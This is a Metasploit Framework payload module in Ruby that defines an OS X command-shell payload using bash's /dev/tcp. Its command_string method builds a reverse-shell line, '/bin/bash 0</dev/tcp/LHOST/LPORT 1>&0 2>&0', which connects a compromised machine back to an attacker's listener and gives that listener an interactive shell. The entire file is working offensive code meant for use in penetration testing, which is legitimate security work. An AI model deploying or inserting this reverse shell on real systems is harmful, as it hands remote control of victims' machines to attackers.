##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OSX Command Shell, Reverse TCP (/dev/tcp)',
      'Description'   => %q{
        Creates an interactive shell via bash's builtin /dev/tcp.
        },
      'Author'        => 'Peter Toth <globetother[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd_bash',
      'RequiredCmd'   => 'bash-tcp',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    return "/bin/bash 0</dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 1>&0 2>&0"
  end
end
